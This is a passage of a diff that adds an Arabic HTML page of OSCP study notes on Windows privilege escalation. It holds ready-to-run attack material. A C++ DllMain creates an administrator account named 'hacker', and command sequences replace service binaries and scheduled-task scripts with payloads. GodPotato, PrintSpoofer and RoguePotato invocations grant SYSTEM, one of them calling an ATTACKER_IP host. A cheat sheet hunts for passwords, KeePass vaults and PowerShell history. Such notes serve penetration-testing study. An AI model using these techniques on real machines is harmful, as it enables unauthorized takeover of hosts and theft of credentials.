+  <div class="mdesc">وضع DLL خبيث في مكان يبحث عنه التطبيق قبل الـ DLL الأصلي — خصوصاً لما التطبيق يحاول يحمَّل DLL غير موجود. الكود ينفَّذ بامتيازات من شغَّل التطبيق.</div>
+</div>
+<div class="method-card">
+  <span class="mnum">03</span>
+  <div class="mtitle">📂 Unquoted Service Paths</div>
+  <div class="mdesc">لما المسار يحتوي على مسافات وغير مُقتبَس، Windows بيجرَّب كل جزء كـ Executable. لو Directory قابلة للكتابة، binary خبيث بيتشغَّل قبل الأصلي.</div>
+</div>
+</div>
+
+<h3>Service Binary Hijacking</h3>
+<div class="code-wrap"><span class="code-tag">powershell — binary hijacking</span><pre><code># 1. عَدّ الخدمات الشغّالة ومساراتها
+Get-WmiObject Win32_Service | Where-Object {$_.State -eq 'Running'} |
+  Select Name,PathName | Format-List
+
+# 2. ابحث عن خدمات خارج مجلدات Windows الافتراضية
+# (C:\Windows\, C:\Windows\System32\)
+# الخدمات في C:\xampp\, C:\Program Files\CustomApp\ هي الأهداف
+
+# 3. فحص صلاحيات الملف
+icacls 'C:\xampp\apache\bin\httpd.exe'
+# BUILTIN\Users:(F)  ← Full Control! إشارة خطر
+
+# 4. نسخ احتياطي واستبدال بـ payload
+copy httpd.exe httpd_orig.exe
+copy C:\Users\dave\evil.exe httpd.exe
+
+# 5. إعادة تشغيل الخدمة (أو انتظار Reboot)
+Restart-Service -Name Apache2.4
+# إذا لم يكن لديك صلاحية → انتظر Reboot أو استغلّ طريقة أخرى
+Stop-Service -Name Apache2.4; Start-Service -Name Apache2.4
+</code></pre></div>
+
+<h3>DLL Hijacking</h3>
+<p>DLLs هي مكتبات كود مشتركة بتتحمَّل من التطبيقات وقت التشغيل. Windows بيبحث عنها بترتيب محدَّد.</p>
+
+<div class="diagram-card">
+<svg viewBox="0 0 700 200" xmlns="http://www.w3.org/2000/svg">
+  <text x="350" y="20" text-anchor="middle" class="dsvg-txt" font-size="12" font-weight="700">Windows DLL Search Order (Safe DLL Mode ON)</text>
+  <!-- Steps -->
+  <rect x="30" y="32" width="640" height="30" rx="5" class="dsvg-box-g"/>
+  <text x="50" y="52" class="dsvg-green" font-size="11" font-weight="700">① Application's own directory</text>
+  <text x="600" y="52" text-anchor="middle" class="dsvg-green" font-size="10">← أول مكان يُفحَص</text>
+
+  <rect x="30" y="68" width="640" height="30" rx="5" class="dsvg-box-b"/>
+  <text x="50" y="88" class="dsvg-blue" font-size="11">② System directories (C:\Windows\System32\)</text>
+
+  <rect x="30" y="104" width="640" height="30" rx="5" class="dsvg-box-b"/>
+  <text x="50" y="124" class="dsvg-blue" font-size="11">③ Windows directory (C:\Windows\)</text>
+
+  <rect x="30" y="140" width="640" height="30" rx="5" class="dsvg-box-a"/>
+  <text x="50" y="160" class="dsvg-amber" font-size="11">④ Current working directory</text>
+
+  <rect x="30" y="176" width="640" height="20" rx="5" class="dsvg-box-a"/>
+  <text x="50" y="191" class="dsvg-amber" font-size="10">⑤ Directories listed in PATH environment variable</text>
+
+  <!-- Attacker label -->
+  <rect x="460" y="32" width="200" height="30" rx="5" class="dsvg-box-r" style="stroke-width:1.5;"/>
+  <text x="560" y="52" text-anchor="middle" class="dsvg-red" font-size="10" font-weight="700">⚡ هدف DLL Hijacking</text>
+</svg>
+<div class="diagram-caption">لو التطبيق يبحث عن DLL غير موجود، الـ Attacker يضع نسخته في Application directory (① )</div>
+</div>
+
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">تحديد التطبيق المستهدَف وتتبّع الـ DLL الناقص</div>
+<div class="step-body"><p>استخدام Process Monitor (Procmon) لمراقبة الـ File System Access. بحثاً عن: <code>NAME NOT FOUND</code> لملفات <code>.dll</code> في Application Directory.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">التأكد من صلاحية الكتابة في Application Directory</div>
+<div class="step-body">
+<div class="code-wrap"><span class="code-tag">powershell</span><pre><code>icacls 'C:\Program Files\FileZilla FTP Client'
+# BUILTIN\Users:(W)  ← Writable!
+</code></pre></div>
+</div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">تجميع DLL خبيث</div>
+<div class="step-body"><p>الـ Payload ينفَّذ في <code>DllMain()</code> عند <code>DLL_PROCESS_ATTACH</code>. مثال: إنشاء حساب Admin جديد أو إطلاق Reverse Shell.</p>
+<div class="code-wrap"><span class="code-tag">c++ — malicious dll</span><pre><code>BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+        system("cmd /c net user hacker Password1! /add");
+        system("cmd /c net localgroup administrators hacker /add");
+    }
+    return TRUE;
+}
+</code></pre></div>
+</div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">نسخ الـ DLL بالاسم المتوقَّع وانتظار المستخدم المرتفع</div>
+<div class="step-body"><p>ضع الـ DLL باسم بالظبط زي اللي التطبيق بيدوَّر عليه (مثلاً <code>TextShaping.dll</code>). انتظار مستخدم بامتيازات أعلى يشغَّل التطبيق — Windows بيحمَّل الـ DLL الخبيث ويُنفَّذ الكود بامتيازاته.</p></div>
+</div>
+</div>
+
+<h3>Unquoted Service Paths</h3>
+<p>لما مسار الخدمة يحتوي على مسافات وغير مُقتبَس، Windows بيسوء تفسير نهاية اسم الملف — بيجرَّب كل prefix كـ Executable قبل أن يصل للملف الحقيقي.</p>
+
+<div class="diagram-card">
+<svg viewBox="0 0 700 180" xmlns="http://www.w3.org/2000/svg">
+  <text x="350" y="18" text-anchor="middle" class="dsvg-txt" font-size="11" font-weight="700">المسار: C:\Program Files\Enterprise Apps\Inventory App\svc.exe</text>
+
+  <!-- Attempt 1 -->
+  <rect x="8" y="30" width="200" height="42" rx="5" class="dsvg-box-r"/>
+  <text x="108" y="47" text-anchor="middle" class="dsvg-red" font-size="11" font-weight="700">① C:\Program.exe</text>
+  <text x="108" y="63" text-anchor="middle" class="dsvg-red" font-size="9">← Windows يجرَّب أولاً</text>
+
+  <line x1="208" y1="51" x2="228" y2="51" class="dsvg-line"/>
+  <polygon points="228,46 238,51 228,56" class="dsvg-arr-r"/>
+
+  <!-- Attempt 2 -->
+  <rect x="238" y="30" width="214" height="42" rx="5" class="dsvg-box-r"/>
+  <text x="345" y="47" text-anchor="middle" class="dsvg-red" font-size="11" font-weight="700">② C:\Program Files\Enterprise.exe</text>
+  <text x="345" y="63" text-anchor="middle" class="dsvg-red" font-size="9">← ثانياً</text>
+
+  <line x1="452" y1="51" x2="472" y2="51" class="dsvg-line"/>
+  <polygon points="472,46 482,51 472,56" class="dsvg-arr-r"/>
+
+  <!-- Attempt 3 -->
+  <rect x="482" y="30" width="210" height="42" rx="5" class="dsvg-box-a"/>
+  <text x="587" y="47" text-anchor="middle" class="dsvg-amber" font-size="10" font-weight="700">③ C:\Program Files\Enterprise</text>
+  <text x="587" y="60" text-anchor="middle" class="dsvg-amber" font-size="9">Apps\Inventory.exe</text>
+
+  <!-- Attempt 4 -->
+  <rect x="200" y="92" width="300" height="42" rx="5" class="dsvg-box-g"/>
+  <text x="350" y="109" text-anchor="middle" class="dsvg-green" font-size="11" font-weight="700">④ C:\Program Files\Enterprise Apps\</text>
+  <text x="350" y="123" text-anchor="middle" class="dsvg-green" font-size="9">Inventory App\svc.exe  ← الملف الحقيقي</text>
+
+  <!-- Attacker note -->
+  <rect x="30" y="148" width="640" height="26" rx="5" class="dsvg-box-r"/>
+  <text x="350" y="165" text-anchor="middle" class="dsvg-red" font-size="10" font-weight="700">⚡ لو C:\Program Files\Enterprise Apps\ قابلة للكتابة → ضع Inventory.exe هناك وينفَّذ الكود في ③</text>
+</svg>
+<div class="diagram-caption">Windows يجرَّب كل prefix بالترتيب — أول Directory قابلة للكتابة تسمح للـ Attacker بتشغيل كوده</div>
+</div>
+
+<div class="code-wrap"><span class="code-tag">cmd + powershell — unquoted paths</span><pre><code># إيجاد الخدمات ذات المسارات غير المُقتبَسة
+wmic service get name,pathname |
+  findstr /i /v '"' |
+  findstr /i /v 'C:\Windows'
+
+# فحص صلاحيات كل Directory في المسار
+icacls "C:\Program Files\Enterprise Apps"
+# BUILTIN\Users:(W)  ← قابلة للكتابة!
+
+# نسخ الـ Payload بالاسم الصحيح
+copy evil.exe "C:\Program Files\Enterprise Apps\Inventory.exe"
+
+# إعادة تشغيل الخدمة
+Start-Service -Name "GammaService"
+Restart-Service -Name "GammaService"
+# → الكود ينفَّذ كـ LocalSystem
+</code></pre></div>
+
+<div class="callout examtip">
+<div class="callout-label">★ مقارنة تقنيات الخدمات الثلاث</div>
+<p><strong>Binary Hijacking:</strong> الأسهل — تحتاج فقط Write Access لملف الـ EXE.<br/>
+<strong>DLL Hijacking:</strong> أخفت — مش بتعدَّل الـ Service EXE نفسه، بتنتظر مستخدم أعلى.<br/>
+<strong>Unquoted Path:</strong> لا تعديل مباشر — فقط وضع ملف في Directory.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU3 -->
+<h2 id="lu3"><span class="num">03</span><span class="htext">Scheduled Tasks · Kernel Exploits · SeImpersonatePrivilege</span></h2>
+
+<h3>Scheduled Task Abuse — استغلال المهام المجدوَلة</h3>
+<p>Task Scheduler بيشغَّل برامج/scripts تلقائياً بناءً على Triggers (إقلاع، تسجيل دخول، وقت محدد، أحداث). ثلاثة أسئلة مفتاحية:</p>
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span><strong>أي مستخدم بيشغَّل المهمة؟</strong> SYSTEM أو Admin = فرصة للترقية</span></div>
+  <div class="goal-card"><span class="gi">2</span><span><strong>إمتى بتشتغل؟</strong> لازم تشتغل في إطار المهمة</span></div>
+  <div class="goal-card"><span class="gi">3</span><span><strong>إيه اللي بتنفَّذه؟</strong> هل ممكن نستبدَل أو نعدَّل الملف؟</span></div>
+</div>
+
+<div class="code-wrap"><span class="code-tag">cmd + powershell — scheduled tasks</span><pre><code># عَدّ كل المهام المجدوَلة
+schtasks /query /fo LIST /v | more
+
+# PowerShell — تفاصيل أوفر، مُصفَّى بدون مهام Microsoft
+Get-ScheduledTask |
+  Where-Object {$_.TaskPath -notlike '\Microsoft*'} |
+  Select TaskName, TaskPath, State
+
+# فحص صلاحيات الملف المنفَّذ
+icacls C:\Users\dave\cleanup.ps1
+# dave:(F)  ← Full Control! المستخدم الحالي يملكه
+
+# استبدال الـ Script بـ payload
+copy cleanup.ps1 cleanup_bak.ps1
+copy evil.ps1 cleanup.ps1
+
+# انتظار الـ Trigger (مثلاً كل دقيقة)
+# → المهمة تشتغل كـ admin → حساب Admin جديد
+</code></pre></div>
+
+<div class="callout case">
+<div class="callout-label">⚙ سيناريو مثالي</div>
+<p>مهمة بتشتغل كل دقيقة، بتنفَّذ script في <code>C:\Users\dave</code> (مجلد المستخدم الحالي)، وبتشتغل كـ Administrator. المختبر بيستبدَل الـ Script بـ Payload خبيث → عند الـ Trigger التالي → ينفَّذ كـ Admin → حساب Admin جديد.</p>
+</div>
+
+<h3>رفع الامتيازات بالاستغلال (Exploit-Based)</h3>
+<div class="method-grid">
+<div class="method-card">
+  <span class="mnum">01</span>
+  <div class="mtitle">Application Vulnerabilities</div>
+  <div class="mdesc">ثغرات في تطبيقات مثبَّتة تسمح بتنفيذ كود. لو التطبيق بيشتغل كـ Admin → ترقية فورية للامتيازات.</div>
+</div>
+<div class="method-card">
+  <span class="mnum">02</span>
+  <div class="mtitle">Kernel Vulnerabilities</div>
+  <div class="mdesc">تستهدف قلب نظام التشغيل — تمنح امتيازات SYSTEM مباشرة. <strong>خطرة:</strong> فشل الـ Exploit ممكن يعمل BSOD. اختبر في Lab أولاً دايماً.</div>
+</div>
+<div class="method-card">
+  <span class="mnum">03</span>
+  <div class="mtitle">Abusing Assigned Privileges</div>
+  <div class="mdesc">بعض حسابات الخدمات لها امتيازات قوية (SeImpersonatePrivilege) لأهداف شرعية — لكنها خطيرة لما الحساب يتعرَّض للاختراق.</div>
+</div>
+</div>
+
+<div class="code-wrap"><span class="code-tag">powershell — kernel exploit research</span><pre><code># الحصول على معلومات الـ OS للبحث عن ثغرات
+systeminfo
+# → OS Name, Version, Build Number, Hotfix(s)
+
+# مقارنة الـ Hotfixes المثبَّتة بقوائم الـ CVEs
+Get-HotFix | Sort-Object InstalledOn -Descending
+
+# أدوات البحث عن Kernel Exploits:
+# - Windows Exploit Suggester (offline)
+# - WinPEAS (يشير للـ CVEs المحتملة)
+# - searchsploit "windows 10 1903 privilege escalation"
+</code></pre></div>
+
+<h3>SeImpersonatePrivilege — من Service Account لـ SYSTEM</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ SeImpersonatePrivilege</div>
+<p>بيسمح للعملية بالتصرّف نيابةً عن مستخدم مُوثَّق آخر. مخصَّص افتراضياً لـ: Local Service, Network Service, IIS App Pools, SQL Server. وده هو نقطة الضعف — لو حصلت على Shell كـ service account بسبب ثغرة Web، غالبًا هتلاقي هذا الامتياز.</p>
+</div>
+
+<div class="diagram-card">
+<svg viewBox="0 0 700 110" xmlns="http://www.w3.org/2000/svg">
+  <rect x="8"   y="30" width="90"  height="50" rx="6" class="dsvg-box-r"/>
+  <text x="53"  y="52" text-anchor="middle" class="dsvg-red"   font-size="9"  font-weight="700">Web Vuln</text>
+  <text x="53"  y="67" text-anchor="middle" class="dsvg-muted" font-size="8">RCE على IIS</text>
+
+  <line x1="98"  y1="55" x2="114" y2="55" class="dsvg-line"/>
+  <polygon points="114,50 124,55 114,60" class="dsvg-arr"/>
+
+  <rect x="124" y="22" width="104" height="66" rx="6" class="dsvg-box-a"/>
+  <text x="176" y="46" text-anchor="middle" class="dsvg-amber" font-size="9"  font-weight="700">Service Account</text>
+  <text x="176" y="62" text-anchor="middle" class="dsvg-muted" font-size="8">Shell كـ iis apppool</text>
+  <text x="176" y="77" text-anchor="middle" class="dsvg-amber" font-size="8">SeImpersonate ✓</text>
+
+  <line x1="228" y1="55" x2="244" y2="55" class="dsvg-line"/>
+  <polygon points="244,50 254,55 244,60" class="dsvg-arr"/>
+
+  <rect x="254" y="30" width="110" height="50" rx="6" class="dsvg-box-b"/>
+  <text x="309" y="52" text-anchor="middle" class="dsvg-blue"  font-size="9"  font-weight="700">Named Pipe</text>
+  <text x="309" y="67" text-anchor="middle" class="dsvg-muted" font-size="8">Malicious pipe</text>
+
+  <line x1="364" y1="55" x2="380" y2="55" class="dsvg-line"/>
+  <polygon points="380,50 390,55 380,60" class="dsvg-arr"/>
+
+  <rect x="390" y="22" width="110" height="66" rx="6" class="dsvg-box-b"/>
+  <text x="445" y="46" text-anchor="middle" class="dsvg-blue"  font-size="9"  font-weight="700">SYSTEM Token</text>
+  <text x="445" y="62" text-anchor="middle" class="dsvg-muted" font-size="8">Coerce privileged</text>
+  <text x="445" y="77" text-anchor="middle" class="dsvg-muted" font-size="8">process to auth</text>
+
+  <line x1="500" y1="55" x2="516" y2="55" class="dsvg-line"/>
+  <polygon points="516,50 526,55 516,60" class="dsvg-arr"/>
+
+  <rect x="526" y="14" width="166" height="82" rx="6" class="dsvg-box-r" style="stroke-width:2;"/>
+  <text x="609" y="43" text-anchor="middle" class="dsvg-red"   font-size="12" font-weight="700">SYSTEM</text>
+  <text x="609" y="61" text-anchor="middle" class="dsvg-muted" font-size="9">Impersonate &amp; Execute</text>
+  <text x="609" y="79" text-anchor="middle" class="dsvg-red"   font-size="9" font-weight="700">★ Full Control</text>
+</svg>
+<div class="diagram-caption">SeImpersonatePrivilege → اصطياد SYSTEM Token → تنفيذ أوامر كـ SYSTEM</div>
+</div>
+
+<div class="code-wrap"><span class="code-tag">powershell + cmd — seimpersonate tools</span><pre><code># التحقق من وجود SeImpersonatePrivilege
+whoami /priv
+# → SeImpersonatePrivilege  Enabled  ← الهدف!
+
+# PrintSpoofer (Windows 10+)
+.\PrintSpoofer64.exe -i -c cmd
+.\PrintSpoofer64.exe -c "cmd /c whoami > C:\temp\out.txt"
+
+# GodPotato (Windows Server 2012 → 2022)
+.\GodPotato.exe -cmd "cmd /c whoami"
+.\GodPotato.exe -cmd "cmd /c net user hacker Pass123! /add && net localgroup administrators hacker /add"
+
+# RoguePotato (بيئات قديمة)
+.\RoguePotato.exe -r <ATTACKER_IP> -e "cmd /c whoami"
+
+# التحقق من نجاح الـ Shell
+whoami  →  nt authority\system
+</code></pre></div>
+
+<div class="callout tip">
+<div class="callout-label">✓ Potato Family — الاختيار الصح</div>
+<p><strong>GodPotato:</strong> الأحدث والأوسع دعماً (2012-2022). <strong>PrintSpoofer:</strong> ممتاز لـ Windows 10 ومتاح على أغلب Servers. <strong>RoguePotato:</strong> للبيئات القديمة. لو خدمة IIS أو SQL Server → فرصة عالية لوجود SeImpersonatePrivilege.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ METHODOLOGY -->
+<h2 id="methodology"><span class="num">04</span><span class="htext">منهجية الـ Windows PrivEsc الكاملة — 8 خطوات</span></h2>
+
+<div class="step-track">
+<div class="step-item">
+<div class="step-num">1</div>
+<div class="step-title">الحصول على Shell الأولي</div>
+<div class="step-body"><p>وصول محدود الامتيازات عبر Client-Side Exploit، Credential Stuffing، أو محاكاة Phishing. المستخدم الأولي عادةً Medium Integrity — هذا هو نقطة البداية.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">2</div>
+<div class="step-title">الوعي الظرفي — Situational Awareness</div>
+<div class="step-body"><p><code>whoami /all</code>، <code>Get-LocalUser</code>، <code>Get-LocalGroup</code>، <code>systeminfo</code>، <code>ipconfig /all</code>، <code>netstat -ano</code>، <code>Get-Process</code>، التطبيقات المثبَّتة. ابنِ صورة كاملة قبل أي استغلال.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">3</div>
+<div class="step-title">صيد بيانات الاعتماد — Credential Hunting</div>
+<div class="step-body"><p>البحث في الملفات النصية، ملفات الإعداد (XAMPP, IIS, web.config)، KeePass، PSReadLine History، PowerShell Transcripts. الخطأ البشري أسهل استغلالاً من ثغرات البرامج.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">4</div>
+<div class="step-title">تعداد الخدمات — Service Enumeration</div>
+<div class="step-body"><p>WMI query لكل الخدمات الشغّالة ومساراتها. ركَّز على الخدمات خارج <code>C:\Windows\</code> — خدمات الجهات الخارجية غالبًا بيكون عندها صلاحيات خاطئة.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">5</div>
+<div class="step-title">فحص مسارات الخدمات</div>
+<div class="step-body"><p>هل فيه Unquoted Paths بمسافات؟ هل الـ Directories في المسار قابلة للكتابة؟ هل DLL Search Order قابلة للاستغلال؟ استخدم <code>icacls</code> لفحص كل Directory محتملة.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">6</div>
+<div class="step-title">فحص المهام المجدوَلة</div>
+<div class="step-body"><p>هل فيه مهام Custom بتشتغل كـ SYSTEM أو Admin؟ هل الـ Executable في مكان قابل للكتابة من المستخدم الحالي؟ <code>schtasks /query /fo LIST /v</code> ثم <code>icacls</code> على الملف المنفَّذ.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">7</div>
+<div class="step-title">تشغيل winPEAS</div>
+<div class="step-body"><p>الفحص الآلي — العناصر الحمراء = انتباه فوري. تحقَّق يدوياً من كل نتيجة. winPEAS ممكن تفوَّت أشياء — استخدمها كمكمَّل مش بديل للتعداد اليدوي.</p></div>
+</div>
+<div class="step-item">
+<div class="step-num">8</div>
+<div class="step-title">البحث والاستغلال</div>
+<div class="step-body"><p>Patches ناقصة → Kernel Exploit (اختبر في Lab أولاً). SeImpersonatePrivilege → Potato Exploits → SYSTEM. فشل كل ما سبق → ارجع للـ Recon أو استغلّ طريق تاني.</p></div>
+</div>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ CHEAT SHEET -->
+<h2 id="cheat"><span class="htext">Cheat Sheet مرجعي</span></h2>
+<div class="cheat-section">
+
+<h4>أوامر Situational Awareness الأساسية</h4>
+<div class="code-wrap"><span class="code-tag">powershell + cmd — quick enum</span><pre><code># الهوية والامتيازات
+whoami
+whoami /groups
+whoami /priv
+whoami /all          # كل المعلومات معاً
+
+# المستخدمون والمجموعات
+Get-LocalUser
+Get-LocalGroup
+Get-LocalGroupMember Administrators
+
+# معلومات النظام
+systeminfo
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+
+# الشبكة
+ipconfig /all
+route print
+netstat -ano
+
+# العمليات والتطبيقات
+Get-Process
+Get-WmiObject -Class Win32_Product | Select Name,Version
+
+# الخدمات
+Get-WmiObject Win32_Service | Select Name,PathName,StartMode,State | Format-List
+sc query type= all state= all
+</code></pre></div>
+
+<h4>بحث بيانات الاعتماد</h4>
+<div class="code-wrap"><span class="code-tag">powershell + cmd — credential hunting</span><pre><code># بحث شامل عن كلمات المرور
+findstr /si "password" C:\*.txt C:\*.xml C:\*.ini C:\*.config 2>nul
+
+# ملفات المستخدمين
+Get-ChildItem -Path C:\Users -Include *.txt,*.pdf,*.docx,*.xlsx,*.ini -Recurse -EA SilentlyContinue
+
+# KeePass vaults
+Get-ChildItem -Path C:\ -Include *.kdbx -Recurse -EA SilentlyContinue
+
+# PSReadLine History
+(Get-PSReadlineOption).HistorySavePath
+type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+
+# إعدادات XAMPP / IIS / تطبيقات الويب
+type C:\xampp\passwords.txt
+type C:\xampp\mysql\bin\my.ini
+findstr /si "password" C:\inetpub\*.config
+</code></pre></div>
+
+<h4>تقنيات Service Exploitation — مرجع سريع</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>التقنية</th><th>الشرط</th><th>الأمر الأساسي</th><th>مستوى الخطورة</th></tr></thead>
+<tbody>
+<tr><td>Binary Hijacking</td><td>Write Access على Service EXE</td><td><code>icacls 'C:\path\svc.exe'</code></td><td>🔴 حرج</td></tr>
+<tr><td>DLL Hijacking</td><td>Write Access على App Dir + DLL ناقص</td><td>Process Monitor لتتبّع DLL loads</td><td>🟡 عالي</td></tr>
+<tr><td>Unquoted Path</td><td>مسافات + غير مُقتبَس + Dir قابل للكتابة</td><td><code>wmic service get name,pathname | findstr /v '"'</code></td><td>🟡 عالي</td></tr>
+<tr><td>Scheduled Task</td><td>Task يشتغل كـ SYSTEM + Script قابل للتعديل</td><td><code>schtasks /query /fo LIST /v</code></td><td>🔴 حرج</td></tr>
+<tr><td>SeImpersonate</td><td>SeImpersonatePrivilege مفعَّل</td><td><code>whoami /priv</code></td><td>🔴 حرج</td></tr>
+<tr><td>Kernel Exploit</td><td>Patches ناقصة</td><td><code>systeminfo + WES-NG</code></td><td>🔴 حرج (خطر BSOD)</td></tr>
+</tbody>
+</table></div>
+
+<h4>Potato Exploits — متى تستخدم أيهم</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>الأداة</th><th>نظام التشغيل</th><th>الاستخدام</th></tr></thead>
+<tbody>
+<tr><td><code>GodPotato</code></td><td>Win Server 2012 → 2022 / Win 10</td><td>الخيار الافتراضي — الأشمل</td></tr>
+<tr><td><code>PrintSpoofer</code></td><td>Win 10 / Win Server 2016+</td><td>بديل ممتاز لـ GodPotato</td></tr>
+<tr><td><code>RoguePotato</code></td><td>Win Server 2016 / بيئات قديمة</td><td>لما GodPotato وPrintSpoofer يفشلوا</td></tr>
+</tbody>
+</table></div>
+
+<h4>Quick Wins — أسرع مسارات للـ SYSTEM</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>#</th><th>التحقق</th><th>الأمر</th><th>الأداة/الاستغلال</th></tr></thead>
+<tbody>
+<tr><td>1</td><td>SeImpersonatePrivilege مفعَّل؟</td><td><code>whoami /priv</code></td><td>GodPotato / PrintSpoofer</td></tr>
+<tr><td>2</td><td>خدمة بـ Write Access على EXE؟</td><td><code>icacls &lt;path&gt;</code></td><td>Service Binary Hijacking</td></tr>
+<tr><td>3</td><td>Scheduled Task بـ Script في مجلد المستخدم؟</td><td><code>schtasks /query</code></td><td>استبدال الـ Script</td></tr>
+<tr><td>4</td><td>Unquoted Path بـ Writable Dir؟</td><td><code>wmic service get</code></td><td>وضع Malicious EXE</td></tr>
+<tr><td>5</td><td>PSReadLine/Transcript بيحتوي Passwords؟</td><td><code>(Get-PSReadlineOption).HistorySavePath</code></td><td>إعادة استخدام كلمات المرور</td></tr>
+<tr><td>6</td><td>DLL ناقص في App Directory قابل للكتابة؟</td><td>Process Monitor</td><td>DLL Hijacking</td></tr>
+</tbody>
+</table></div>
+
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ SUMMARY -->
+<h2 id="summary"><span class="htext">الخلاصة العامة للموديول</span></h2>
+<p>الموديول ده بنى إطاراً منهجياً لرفع الامتيازات على Windows — من فهم نموذج التحكّم في الوصول، لصيد بيانات الاعتماد المخبأة، لاستغلال إعدادات خاطئة في الخدمات والمهام، وصولاً للامتيازات الكاملة عبر تقنيات الـ Kernel والـ Token Impersonation.</p>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./module14_summary.txt</div>
+<ul>
+<li>Windows بيستخدم SIDs وAccess Tokens ومستويات MIC وUAC للتحكّم في الامتيازات — فهمها ضروري لتحديد مسارات الترقية</li>
+<li>الوعي الظرفي (المستخدمون، المجموعات، الشبكة، العمليات، التطبيقات) هو أساس كل محاولة لرفع الامتيازات</li>
+<li>بيانات الاعتماد بتتخزَّن في ملفات نصية وملفات إعداد وملاحظات اجتماعات — الخطأ البشري أسهل استغلالاً من ثغرات البرامج</li>
+<li>PSReadLine History وTranscript Logs بتكشف كلمات مرور Plaintext حتى بعد تشغيل Clear-History</li>
+<li>Service Binary Hijacking وDLL Hijacking وUnquoted Paths كلها تسمح بتنفيذ كود مرتفع الامتيازات عبر إعدادات خاطئة</li>
+<li>المهام المجدوَلة التي تشغَّل كـ SYSTEM وScripts في مجلدات قابلة للكتابة = هدف مثالي للاستغلال</li>
+<li>SeImpersonatePrivilege + Potato Exploits = المسار الأسهل والأسرع من Service Account لـ SYSTEM</li>
+<li>Kernel Exploits قوية لكن خطيرة (BSOD) — دايماً اختبر في Lab قبل الإنتاج</li>
+<li>winPEAS مُسرِّعة للاكتشاف لكن ليست كاملة — التعداد اليدوي لا غنى عنه</li>
+</ul>
+</div>
+
+<blockquote>
+<p><strong>رفع الامتيازات مش حظ — هو منهجية.</strong> المختبر الذي يبني صورة كاملة عن البيئة قبل أي استغلال، ويتحقّق من كل مسار محتمل بترتيب من الأسهل للأصعب، هو من يصل للـ SYSTEM بأقل وقت وأقل ضوضاء.</p>
+</blockquote>
+
+<div class="callout examtip">
+<div class="callout-label">★ Professional Mindset</div>
+<p>في الـ Engagement الحقيقي: ابدأ بـ Quick Wins (SeImpersonate أو Credential Files) → لو فشلوا انتقل للخدمات (Binary/Unquoted/DLL) → لو فشلوا جرَّب Scheduled Tasks → كأخير ملاذ Kernel Exploits. وثَّق كل خطوة وكل نتيجة — حتى الفاشلة — لأن الفشل بيرشدك للمسار الصح.</p>
+</div>
+
+<hr />
+<p><em>نهاية نوتس الموديول الرابع عشر — OSCP: Windows Privilege Escalation</em></p>
+<div class="footer-note">-- EOF: module-14/windows-privesc.md --</div>
+
+</div>
+
+<script>
+(function(){
+  var root=document.documentElement,btn=document.getElementById('themeSwitch');
+  function applyTheme(t){root.setAttribute('data-theme',t);btn.textContent='theme: '+t;try{localStorage.setItem('oscp-notes-theme',t);}catch(e){}}
+  var saved='dark';try{saved=localStorage.getItem('oscp-notes-theme')||'dark';}catch(e){}
+  applyTheme(saved);
+  btn.addEventListener('click',function(){applyTheme(root.getAttribute('data-theme')==='dark'?'light':'dark');});
+  var bar=document.getElementById('progressBar');
+  function onScroll(){var h=document.documentElement,s=h.scrollTop,ht=h.scrollHeight-h.clientHeight;bar.style.width=(ht>0?(s/ht*100):0)+'%';var t=document.getElementById('toTop');s>500?t.classList.add('show'):t.classList.remove('show');}
+  document.addEventListener('scroll',onScroll);onScroll();
+  document.getElementById('toTop').addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+  document.querySelectorAll('.code-wrap').forEach(function(wrap){
+    var c=wrap.querySelector('code');if(!c)return;
+    var b=document.createElement('button');b.className='copy-btn';b.textContent='copy';
+    b.addEventListener('click',function(){if(navigator.clipboard){navigator.clipboard.writeText(c.innerText).then(function(){b.textContent='copied ✓';b.classList.add('copied');setTimeout(function(){b.textContent='copy';b.classList.remove('copied');},1500);});}});
+    wrap.appendChild(b);
+  });
+})();
+</script>
+</body>
+</html>
